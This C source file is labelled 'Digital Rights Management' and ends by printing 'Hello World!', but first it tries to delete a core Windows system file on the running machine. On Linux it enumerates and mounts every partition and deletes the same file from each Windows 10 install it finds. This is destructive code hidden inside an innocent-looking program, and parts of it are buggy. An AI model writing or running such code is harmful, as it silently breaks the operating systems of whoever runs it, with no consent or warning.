/* Адриан Баррето 19/02/18
 * Copyright (c) 2018 TTFH
 * Digital Rights Management
 * This software is distributed "as-is", with no warranty expressed or implied,
 * and no guarantee for accuracy or applicability to any purpose. 
 */

#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#include <shlobj.h>
#include <windows.h>
#else
#include <sys/stat.h>
#endif

#define RED "\x1b[91m"
#define NORMAL "\x1b[0m"

enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };

WinVer WindowsVersion() {
#ifdef _WIN32
  FILE* pFile = fopen("version.cmd", "w");
  if (pFile == NULL) return Error;
  fputs("@Echo off\n del /F version >nul 2>&1\n ver > version", pFile);
  fclose(pFile);
  system("C:\\Windows\\System32\\cmd.exe /C version.cmd");
  unsigned int os_ver1, os_ver2; char str_ver;
  pFile = fopen("version", "r");
  if (pFile == NULL) return Error;
  int readed = fscanf(pFile, "\nMicrosoft Windows [%s %d.%d.", &str_ver, &os_ver1, &os_ver2);
  fclose(pFile);
  remove("version");
  remove("version.cmd");

  if (readed != 3) return Error;
  switch (os_ver1) {
    case 10:
      return Win10;
    case 6:
      switch (os_ver2) {
        case 3: return Win8_1;
        case 2: return Win8;
        case 1: return Win7;
        case 0: return WinVista;
      }
    break;
    case 5:
      switch (os_ver2) {
        case 2: return WinXP64;
        case 1: return WinXP32;
        case 0: return Win2000;
      }
    break;
  }
#endif
  return Other;
}

static void DeleteIf[[maybe_unused]](bool cond, const char* path) {
  if (cond) remove(path);
#ifdef _WIN32
  else {
    MessageBox(NULL, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
    exit(EXIT_FAILURE);
  }
#endif
}

void MountedSearch() {
#ifndef _WIN32
  printf("Looking for mounted drives...\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 != \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != NULL);

  char drive[256];
  char source[256];
  char name[256];
  char del[256];

  while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
    printf("Drive %s mounted in: %s\n", drive, source);
    strcpy(name, source);
    strcat(name, "/Windows/System32/d3dx12.dll");
    // <- That's a valid path.
    printf("Looking for file: %s\n", name);
    struct stat buffer;
    if (stat(name, &buffer) == 0) {
      printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
      strcpy(del, source);
      strcat(del, "/Windows/System32/hall.dll");
      printf("Deleting %s ...\n", del);
      remove(del);
    }
    printf("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

void UnmountedSearch() {
#ifndef _WIN32
  printf("Looking for unmounted drives...\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 == \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != NULL);

  char drive[256];
  char source[256];
  char name[256];
  char del[256];

  while (fscanf(drive_list, "%s\n", drive) == 1) {
    printf("Unmounted drive found in: %s\n", drive);

    printf("Mounting drive...\n");
    char mount[256] = "udisksctl mount -b /dev/";
    strcat(mount, drive);
    strcat(mount, " > source");
    system(mount);

    FILE* pFile = fopen("source", "r");
    assert(pFile != NULL);
    int mounted = fscanf(pFile, "Mounted %s at %s", drive, source);
    if (mounted != 2) {
      printf(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n", drive);
      continue;
    }

    int size = strlen(source);
    source[size - 1] = '\0';
    printf("Drive %s mounted in: %s\n", drive, source);

    strcpy(name, source);
    strcat(name, "/Windows/System32/d3dx12.dll");
    printf("Looking for file: %s\n", name);
    struct stat buffer;
    if (stat(name, &buffer) == 0) {
      printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
      strcpy(del, source);
      strcat(del, "/Windows/System32/hall.dll");
      printf("Deleting %s ...\n", del);
      remove(del);
    }
    printf("\n");
  }
  fclose(pFile);
  fclose(drive_list);
  remove("source");
  remove("drive_list");
#endif
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
  if (WindowsVersion() == Win10)
    DeleteIf(IsUserAnAdmin(), "C:\\Windows\\System32\\hall.dll");
#endif

  printf("You are using Windows ");
  WinVer ver = WindowsVersion();
  switch (ver) {
    case Win10: printf("10");
    break;
    case Win8_1: printf("8.1");
    break;
    case Win8: printf("8");
    break;
    case Win7: printf("7");
    break;
    case WinVista: printf("Vista");
    break;
    case WinXP64: printf("XP x64");
    break;
    case WinXP32: printf("XP x86");
    break;
    case Win2000: printf("2000");
    break;
    case Other: printf("%c... no, you're not.", 8);
    break;
    case Error: printf("--- ERROR ---");
    break;
  }
  printf("\n\n");

  MountedSearch();
  UnmountedSearch();

  // Main program start here.
  printf("\n");
  printf("Hello World!");
  printf("\n\n");
  return 0; // No error.
}

/* ------------ HEADER ------------ *
  enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
  WinVer WindowsVersion();
  void MountedSearch();
  void UnmountedSearch();
  void DeleteIf(bool, const char*);
*/
